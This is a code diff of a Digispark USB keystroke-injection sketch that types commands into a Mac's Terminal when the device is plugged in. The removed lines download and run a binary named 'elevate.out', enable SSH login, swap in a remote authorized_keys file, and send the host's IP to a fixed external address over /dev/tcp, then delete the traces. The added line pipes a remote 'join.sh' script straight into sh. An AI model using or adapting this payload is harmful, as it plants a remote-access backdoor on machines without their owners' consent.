@@ -4,7 +4,7 @@ void setup() {
     // initialize the digital pin as an output.
     pinMode(0, OUTPUT); // LED on Model B
     pinMode(1, OUTPUT); // LED on Model A
-    
+
     // Some systems require this
     DigiKeyboard.sendKeyStroke(0);
 
@@ -12,43 +12,15 @@ void setup() {
     digitalWrite(0, HIGH);
     digitalWrite(1, HIGH);
 
-    // Keyboard setup GUI will flash up when you plug in. Wait 10 seconds to avoid this.
-    //DigiKeyboard.delay(10000);
-
     DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
     DigiKeyboard.delay(100);
-    DigiKeyboard.print("term");
-    DigiKeyboard.delay(10000);
+    DigiKeyboard.print("Terminal");
+    DigiKeyboard.delay(4000); // Sometimes Spotlight needs a bit to find what it's looking for
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
-    DigiKeyboard.delay(5000);
-    DigiKeyboard.sendKeyStroke(KEY_C, MOD_CONTROL_LEFT);
-    DigiKeyboard.delay(50);
-    // Type out commands letter by letter (assumes US-style keyboard)
-    DigiKeyboard.delay(5000);
-    DigiKeyboard.println("curl -O https://erikboesen.com/downloads/elevate.out");
-    DigiKeyboard.delay(5000);
-    DigiKeyboard.println("chmod +x ./elevate.out");
-    DigiKeyboard.delay(50);
-    DigiKeyboard.println("./elevate.out");
-    DigiKeyboard.delay(2000);
-    // Set path in order to use commands as below without error
-    DigiKeyboard.println("export PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin");
-    // Open ssh service, accessible for all users
-    DigiKeyboard.println("dscl . change /Groups/com.apple.access_ssh RecordName com.apple.access_ssh com.apple.access_ssh-disabled");
-    DigiKeyboard.println("sudo systemsetup -setremotelogin on");
-    DigiKeyboard.println("mkdir -p ~/.ssh");
-    DigiKeyboard.delay(50);
-    DigiKeyboard.println("mv ~/.ssh/authorized_keys ~/.ssh/authorized_keys_old");
-    DigiKeyboard.delay(50);
-    DigiKeyboard.println("curl https://gist.githubusercontent.com/ErikBoesen/3d24a2bda89f932e4c1a93a622b53704/raw --output ~/.ssh/authorized_keys");
-    DigiKeyboard.delay(50);
-    DigiKeyboard.println("exit");
-    DigiKeyboard.println("IP=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'`");
-    DigiKeyboard.println("exec 3<>/dev/tcp/108.18.124.187/2043");
-    DigiKeyboard.println("echo \"${IP}\" >&3");
-    DigiKeyboard.println("cat <&3");
-
-    DigiKeyboard.println("rm elevate.out && killall term");
+    DigiKeyboard.delay(2000); // Give Terminal a couple seconds to start up
+    DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT); // Open a new tab
+    DigiKeyboard.delay(800);
+    DigiKeyboard.println("curl -L erikboesen.com/join.sh |sh"); // Download and run join script; will now run without further input
 
     // Turn off LED
     digitalWrite(0, LOW);
@@ -64,4 +36,3 @@ void loop() {
     // prevent missing the first character after a delay:
     exit(0);
 }
-
